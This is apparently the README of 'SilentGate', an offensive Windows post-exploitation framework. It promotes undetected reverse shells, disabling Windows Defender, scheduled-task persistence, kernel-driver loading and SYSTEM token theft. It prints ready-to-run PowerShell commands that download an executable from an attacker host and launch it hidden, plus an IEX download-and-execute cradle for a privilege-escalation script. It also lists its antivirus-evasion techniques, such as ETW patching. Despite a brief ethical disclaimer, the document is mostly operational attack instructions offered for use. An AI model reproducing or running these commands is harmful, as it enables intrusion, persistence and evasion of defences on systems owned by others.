<p align="center">
  <img src="https://raw.githubusercontent.com/JarDaNi686/SilentGate/main/data/banner.png" alt="SilentGate" width="600"/>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-red?style=for-the-badge&logo=windows"/>
  <img src="https://img.shields.io/badge/Detections-Zero-brightgreen?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/UAC-Zero-brightgreen?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Version-1.0-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Author-JarDani-red?style=for-the-badge"/>
</p>

<p align="center">
  <b>Advanced Windows post-exploitation framework — zero detections, zero UAC, two-level privilege escalation</b>
</p>

---

## Overview

SilentGate is a research-grade Windows evasion framework that delivers reverse shells with:

- **Zero detections** — Quantum GF(2⁸) mutation generates a unique binary every run
- **Zero UAC** — Level 1 shell requires no user interaction whatsoever
- **One click SYSTEM** — Level 2 escalates to SYSTEM with a single UAC click
- **Persistent** — Survives reboot via scheduled task
- **Universal** — Works on any network, any IP, auto-configured via `silentgate.py`

Tested against Windows Defender (fully updated) on Windows 10 19045 and Windows 11 26200.

---

## Quick Start

```bash
# Clone
git clone https://github.com/JarDaNi686/SilentGate.git
cd SilentGate

# Run centralized launcher
sudo python3 silentgate.py
```

The launcher will:
1. Ask for your Kali IP, target IP, and port
2. Quantum-mutate and compile a unique `sg_loader.exe`
3. Start HTTP server automatically
4. Show exact commands to run on target
5. Start nc listener and wait for shell

---

## Attack Levels

### Level 1 — Medium Shell

Zero detections · Zero UAC · Zero user interaction

Run 3 commands on target Windows machine. Shell connects automatically.

```powershell
New-Item -ItemType Directory -Path 'C:\ProgramData\lpe' -Force | Out-Null
(New-Object Net.WebClient).DownloadFile('http://KALI:8080/output/sg_loader.exe','C:\ProgramData\lpe\sg_loader.exe')
Start-Process 'C:\ProgramData\lpe\sg_loader.exe' -WindowStyle Hidden
```

### Level 2 — SYSTEM Shell

One UAC click · Persistent · Defender disabled · Kernel token steal

From the medium shell, paste one command. UAC prompt appears. User clicks YES once. SYSTEM shell connects.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://KALI:8080/output/level2.ps1')
```

What happens automatically after YES:
- Defender disabled silently
- Persistence added (scheduled task at boot)
- Kernel driver loaded
- SYSTEM token stolen
- SYSTEM shell connects to Kali

---

## Lab Results

| Target | Shell | UAC Prompts | Detections | Persistence |
|--------|-------|-------------|------------|-------------|
| Win10 19045 VM | Medium | 0 | 0 | ✅ |
| Win11 26200 VM | Medium → SYSTEM | 0 → 1 | 0 | ✅ |
| Win11 Physical | Medium | 0 | 0 | ✅ |

---

## How It Works

### Quantum Evasion Engine
Every run generates a mathematically unique binary:

GF(2⁸) field arithmetic → anti-sandbox verification
Lorenz chaos attractor → unique timing per run
Kolmogorov complexity → entropy analysis evasion
Poisson sleep distribution → timing fingerprint evasion
PEB walk API resolution → no suspicious imports
ETW event write patch → telemetry blind spot


Different MD5, different GF polynomial, different Lorenz parameters — Defender cannot build a signature.

### Two-Level Chain

silentgate.py
↓
├── LEVEL 1: sg_loader.exe (quantum mutated)
│ └── PowerShell shell → Medium integrity
│
└── LEVEL 2: level2.ps1
├── ShellExecuteEx runas (UAC once)
├── Disable Defender
├── Add scheduled task persistence
├── Load kernel driver
└── Steal SYSTEM token → SYSTEM shell


---

## Project Structure

SilentGate/
├── silentgate.py ← Centralized launcher (start here)
├── GUIDE.md ← Complete practical guide
│
├── core/
│ ├── quantum_mutate.py ← Quantum evasion engine
│ ├── build_quantum.sh ← Build script
│ └── sg_system.c ← SYSTEM token steal source
│
├── output/
│ ├── sg_loader.c ← Reverse shell source
│ ├── sg_loader.exe ← Compiled (auto per-run)
│ ├── sg_system.exe ← SYSTEM shell (auto per-run)
│ ├── sg_chain.ps1 ← PS1 chain
│ ├── level2.ps1 ← Level 2 SYSTEM chain
│ └── v9/ ← Kernel driver + certs
│
└── tools/
└── stk.exe ← Token stealer


---

## Requirements

```bash
# Kali Linux
sudo apt install mingw-w64 python3 python3-scapy

# Python
pip install rich --break-system-packages
```

---

## Ethical Statement

SilentGate is built for **authorised penetration testing**, security research, and education only.
All testing performed in isolated lab environment.
You must have written permission before using this tool against any system.

---

## Author

**JarDani** — github.com/JarDaNi686

## License

MIT — Free for the security community.
